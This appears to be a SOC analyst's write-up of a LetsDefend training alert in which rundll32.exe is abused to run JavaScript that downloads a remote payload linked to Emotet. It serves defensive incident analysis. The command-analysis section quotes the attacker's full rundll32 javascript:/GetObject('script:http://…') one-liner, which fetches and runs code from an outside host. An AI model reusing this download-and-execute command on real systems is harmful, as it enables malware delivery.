# SOC125 – Suspicious Rundll32 Activity

**Platform:** LetsDefend | **Severity:** High | **Classification:** True Positive | **Date:** February 14, 2021 **Host:** `EmilyComp` (`172.16.17.49`) | **User:** `Emily` | **Event ID:** 58

## Summary

`rundll32.exe` on EmilyComp was used to run JavaScript that pulled a remote script disguised as `KBDYAK.exe`, and the device allowed it. In the same minute, the host connected to `67.68.210.95`, an IP that VirusTotal ties to Emotet, so the alert was closed as a true positive.

<img width="1616" height="398" alt="soc125-01-alert-details" src="https://github.com/user-attachments/assets/b9fdcc77-e0dc-4f18-afd3-b7f48918679f" />


## The Attack

`rundll32.exe` is a Microsoft-signed tool that runs functions inside DLL files, which makes it a common living-off-the-land binary (LOLBin).

Here it loads `mshtml.dll` and calls its `RunHTMLApplication` function, which makes rundll32 behave like `mshta.exe` and run the `javascript:` text as an HTML Application. `GetObject('script:<url>')` then downloads a remote scriptlet and runs it, so the payload never needs to be saved as an obvious file first.

## Timeline

| Time (alert) | Event |
|--------------|-------|
| 12:12 | `rundll32.exe` runs JavaScript that fetches `KBDYAK.exe` from `ru-uid-507352920.pp.ru` |
| 12:12 | Host connects to `67.68.210.95` (Network Action) |
| 12:13:08 | Proxy allows `172.16.17.49 → 67.68.210.95:80`* |
| 12:13:34 | SOC125 alert fires; device action Allowed |

*The proxy log shows 04:13:08 for this request; the log sources record time differently.

## Investigation

### 1. Alert Analysis

- **Host:** `EmilyComp` (`172.16.17.49`), Windows 10 client, primary user `Emily`
- **File:** `KBDYAK.exe` (848 KB)
- **MD5:** `a4513379dad5233afa402cc56a8b9222`
- **Device Action:** Allowed

The name `KBDYAK` copies the pattern of Windows keyboard layout files (`KBD*.dll`), a common way to make malware look like a system file.

### 2. Command Analysis

Terminal history captured the command behind the alert:

```
rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')
```

- `javascript:'../mshtml,RunHTMLApplication '` loads `mshtml.dll` and runs the rest of the line as an HTML Application.
- `document.write();` is filler that lets the script run cleanly.
- `GetObject('script:http://...')` downloads and executes a remote scriptlet from a free `.pp.ru` subdomain.

No legitimate program uses rundll32 to run JavaScript from the internet. The other terminal entries (`cd`, `dir`, `type notes.txt`) are from December 2020 and unrelated.

<img width="1388" height="788" alt="soc125-02-terminal-history" src="https://github.com/user-attachments/assets/f580ba85-adf8-49f7-a2ac-11e682cd10b7" />


### 3. Network and Log Analysis

Network Action shows EmilyComp connecting to `67.68.210.95` at 12:12, the same minute the command ran. VirusTotal flags the IP as malicious with 9 of 92 vendors (malware and phishing), hosted on Bell Canada (AS577). Its relations list thousands of malicious communicating files, including an Emotet sample and malicious Word documents, and it appears in an `IOC_Emotet.db` file.

<img width="1414" height="498" alt="soc125-03-network-action" src="https://github.com/user-attachments/assets/be1792d6-21d2-4745-8a05-49a32c10d6be" />


<img width="916" height="944" alt="soc125-04-virustotal-ip-detection" src="https://github.com/user-attachments/assets/3745ab91-6242-42c3-a32e-2107b9f3b893" />


<img width="919" height="955" alt="soc125-05-virustotal-ip-relations" src="https://github.com/user-attachments/assets/48d8efa8-ab29-4ffe-be21-af81d66c09f7" />


A Log Management search for `67.68.210.95` returned the proxy request from EmilyComp to a long, random-looking path on port 80, allowed by the proxy. That confirms the C2 was accessed.

The same search returned a second hit: on 2020-08-29, host `172.16.17.14` sent a POST request to the same IP from a process named `rasser.exe`. That host may have an older, unrelated infection and should be investigated separately.

<img width="1637" height="275" alt="soc125-06-logs-c2-ip" src="https://github.com/user-attachments/assets/ad354ab0-88c6-4623-a86e-6227b49926f6" />


### 4. Verdict Reasoning

| Clue | Meaning |
|------|---------|
| rundll32 running `javascript:` with `RunHTMLApplication` | LOLBin used to execute script code |
| `GetObject('script:http://...')` | Remote payload downloaded and executed |
| `KBDYAK.exe` name | Masquerading as a Windows keyboard file |
| Connection to `67.68.210.95` in the same minute | Host reached attacker infrastructure |
| IP tied to Emotet on VirusTotal | Known malware C2 |
| Device action Allowed | Nothing stopped the execution |

The malware ran, was not quarantined, and contacted its C2 server, which makes this a **true positive**.

## Artifacts

Malicious URLs, domains and IPs are defanged.

| Type | Indicator |
|------|-----------|
| MD5 | `a4513379dad5233afa402cc56a8b9222` (`KBDYAK.exe`) |
| URL | `hxxp://ru-uid-507352920.pp[.]ru/KBDYAK.exe` |
| Domain | `ru-uid-507352920.pp[.]ru` |
| C2 IP | `67.68.210[.]95` |
| Related host | `172.16.17.14` (`rasser.exe` POST to the same IP, 2020-08-29) |

## Response and Recommendations

Contain EmilyComp, reset Emily's credentials since Emotet steals credentials and spreads, and reimage the host. Block `67.68.210.95` and the `pp.ru` domain at the proxy, firewall and DNS, search other endpoints for the MD5 and connections to the IP, and open a separate investigation into `172.16.17.14`.

To prevent a repeat, alert on `rundll32.exe` command lines containing `javascript:` or `RunHTMLApplication`, alert on rundll32 making network connections, and block outbound traffic to free hosting domains where possible.

## Conclusion

<img width="613" height="331" alt="soc125-07-playbook-result" src="https://github.com/user-attachments/assets/40695e55-eaa0-46e9-8b5b-ad60776e8445" />


**True Positive.** `rundll32.exe` was abused on `EmilyComp` to download and run a remote payload disguised as `KBDYAK.exe`, and the host then contacted `67.68.210.95`, an Emotet-linked C2 IP. The malware was not quarantined.

**MITRE ATT&CK:** T1218.011 (System Binary Proxy Execution: Rundll32), T1204 (User Execution), T1105 (Ingress Tool Transfer), T1071.001 (Application Layer Protocol: Web Protocols), T1036 (Masquerading)
